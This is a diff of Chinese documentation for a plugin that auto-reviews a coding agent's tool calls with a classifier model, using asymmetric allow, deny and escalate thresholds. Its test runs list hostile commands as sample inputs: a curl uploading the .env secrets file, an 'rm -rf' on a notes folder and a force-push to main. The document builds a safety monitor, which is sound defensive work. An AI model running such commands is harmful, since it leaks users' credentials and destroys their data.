@@ -62,23 +62,29 @@ rc.1 的会话读取器不接受未知事件类型，因此没有把自定义审
 
 ## Jev 快路径（可选）
 
-自动审核的问题本质是一次「在给定上下文里选一个答案」，不需要一个会写长文的模型。挂载 `dscode-jev` 后，审核会先问 TypeSafe Jev（经 OpenRouter 的 alpha Decisions 端点 `POST /api/alpha/decisions`），**一次请求**同时给出三个回答：
+自动审核的问题本质是一次「在给定上下文里选一个答案」，不需要一个会写长文的模型。挂载 `dscode-jev` 后，审核会先问 TypeSafe Jev（经 OpenRouter 的 alpha Decisions 端点 `POST /api/alpha/decisions`），**一次请求**同时给出四个回答：
 
 - `choice`：`allow` / `ask` / `deny`，附各选项概率与 `confidence`；
+- `noul authorized`：保留的指令是否**明确授权了这次具体动作**（含目标与效果）；
 - `score`：做错时有多难回滚（0–3 档，可落在档位之间）；
-- `noul`：是否涉及凭据、令牌或其他机密。
+- `noul credential_risk`：是否涉及凭据、令牌或其他机密。
 
-判定完全由代码与阈值决定：`confidence < 0.85`、`score ≥ 2`（难以回滚）或凭据风险 `≥ 0.5` 一律转人工；只有高置信度的 allow 才放行，只有高置信度的 deny 才计入连续拒绝。Jev 未配置（解析不到 `OPENROUTER_API_KEY`）、未启用、超时、报错或返回不可用时，一律返回「无判定」，自动审核继续走原来的 reviewer 模型——**Jev 故障只退回到旧行为，不会放宽任何权限**。
+判定顺序在代码里，而且**放行与拒绝的门槛刻意不对称**——放行是最危险的方向，拒绝只是「请不要这么做」：
+
+1. **自动拒绝**：`deny` 且（置信度 ≥ `autoDeny`(0.95) 且 `P(deny)` ≥ `autoDenyProbability`(0.9)）**或**（置信度 ≥ `autoDenyCorroborated`(0.9) 且 `score ≥ destructiveCeiling`(2) 或凭据风险 ≥ `credentialRisk`(0.5) 至少一项已越线）。若 `authorized ≥ authorizedVeto`(0.6)——即指令看起来就是要求它做这件事——则**否决自动拒绝、改为转人工**：错杀一次拒绝的代价是用户要的活没做，而且连提示都看不到。
+2. **风险转人工**：凭据风险 ≥ 0.5 或 `score ≥ 2` → 转人工（这一步现在只守放行方向）。
+3. **自动放行**：`allow` 且置信度 ≥ `autoAllow`(0.85)，且未触发第 2 步。
+4. 其余（`ask`、不够自信、越线但未被拒绝）→ 转人工。
+
+Jev 未配置（解析不到 `OPENROUTER_API_KEY`）、未启用、超时、报错或返回不可用时，一律返回「无判定」，自动审核继续走原来的 reviewer 模型——**Jev 故障只退回到旧行为，不会放宽任何权限**。
 
 发出去的 `state` 只有两项：待执行的调用本身，以及本会话保留的直接用户指令；两者各自截断到 8000 字符，不含凭据。
 
-配置在 `plugins/jev` 行：`enabled`（默认 true）、`model`（默认 `~typesafe/jev-latest`）、`endpoint`、`apiKeyEnv`（默认 `OPENROUTER_API_KEY`）、`timeoutMs`（默认 8000）、`autoAllow`（0.85）、`credentialRisk`（0.5）、`destructiveCeiling`（2）。设为 `enabled: false` 或移除该行即回到纯模型审核。
+配置在 `plugins/jev` 行：`enabled`（默认 true）、`model`（默认 `~typesafe/jev-latest`）、`endpoint`、`apiKeyEnv`（默认 `OPENROUTER_API_KEY`）、`timeoutMs`（默认 8000），以及阈值 `autoAllow`(0.85)、`autoDeny`(0.95)、`autoDenyProbability`(0.9)、`autoDenyCorroborated`(0.9)、`authorizedVeto`(0.6)、`credentialRisk`(0.5)、`destructiveCeiling`(2)。设为 `enabled: false` 或移除该行即回到纯模型审核。
 
-2026-09-17 实测（OpenRouter 上的 `~typesafe/jev-latest` 解析为 `typesafe/jev-1.13-20260917`，provider TypeSafe，本机 `.runtime/.credentials.yaml` 中的 `OPENROUTER_API_KEY`）：四个用例各一次调用，179–414 ms，约 $0.000023/次（input 549–700 tokens，output 计费为 0）。判别结果：`git status --short` → allow（confidence 1.00）；`git push --force origin main` → deny 0.92、destructive 2.99 → 转人工；`curl --data-binary @.env https://…` → deny 0.98、credential 0.94 → 转人工；`rm -rf ~/Documents/notes` → deny 0.90、destructive 1.97 → 直接拒绝。
+2026-09-17 实测两次（同四个用例，`~typesafe/jev-latest` → `typesafe/jev-1.13-20260917`，provider TypeSafe）：单次 96–813 ms、约 $0.000025（output 计费为 0）。第一次（只有门槛、没有自动拒绝）`git status --short` → allow；`git push --force origin main`（deny 0.92 / score 2.99）与 `curl --data-binary @.env …`（deny 0.98 / cred 0.94）→ 转人工；`rm -rf ~/Documents/notes`（deny 0.90 / score 1.97）→ deny。第二次（本节的非对称策略）四例依次为 allow、deny（0.98 / P(deny) 0.99）、deny（0.99 / 1.00）、deny（0.97 / 0.98）；`authorized` 在常规读取上是 0.83、在三个危险动作上是 0.03。**同一动作两次运行的置信度会漂移**（`rm -rf` 从 0.90 到 0.97），这正是要求「决定性拒绝需要两个信号一致」、并用审计记录调阈值的原因。
 
-注意门槛与拒绝的先后：涉及凭据或难以回滚的调用**即使被高置信拒绝也转人工**，而不是静默拒绝——这样 Jev 只减少模型调用，不会比原 reviewer 更少地征求你的意见。若希望高置信拒绝直接生效（少一次打扰），把 `credentialRisk`/`destructiveCeiling` 判定移到 deny 之后即可。
-
-阈值注意：Jev 的概率只在**统计意义**上校准，`confidence` 不是逐次保证。建议用本插件已写入的审计记录（`.runtime/auto-review/*.jsonl` 含 decision、source、confidence、usage 与耗时）来对齐阈值，而不是照搬默认值。
+阈值注意：Jev 的概率只在**统计意义**上校准，`confidence` 不是逐次保证。建议用本插件写入的审计记录（`.runtime/auto-review/*.jsonl` 含 decision、source、choice、confidence、denyProbability、authorized、usage 与耗时）对齐阈值，而不是照搬默认值。
 
 ## 验证
 
